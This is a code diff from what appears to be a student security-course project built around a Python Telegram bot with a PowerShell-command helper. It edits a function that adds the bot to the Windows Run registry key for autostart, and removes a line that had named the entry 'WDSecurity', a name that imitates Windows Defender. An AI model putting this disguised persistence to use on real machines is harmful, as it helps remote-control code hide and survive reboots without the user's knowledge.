@@ -109,13 +109,14 @@ def powershell_command(cmd):
     return runCommand.stdout
 
 
+# Code uit week 2 opdracht
 def add_to_registry(program_name):
     try:
         # Bepaal de registersleutel voor de huidige gebruiker
         registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
 
         # Voeg een nieuwe registerwaarde toe
-        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{get_username()}\Downloads\Minor-AD-CS-blok-3\pythonTelegramBot\main.py")
+        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{os.getlogin()}\Downloads\Minor-AD-CS-blok-3\pythonTelegramBot\main.py")
 
         print(f"{program_name} is toegevoegd aan de opstart-items")
 
@@ -124,11 +125,4 @@ def add_to_registry(program_name):
 
     except Exception as e:
         print(f"Fout bij toevoegen aan het register: {e}")
-
-programma_naam = "WDSecurity"
-# add_to_registry(programma_naam, programma_pad)
-
-# Get user name
-def get_username():
-    return os.getlogin()
 
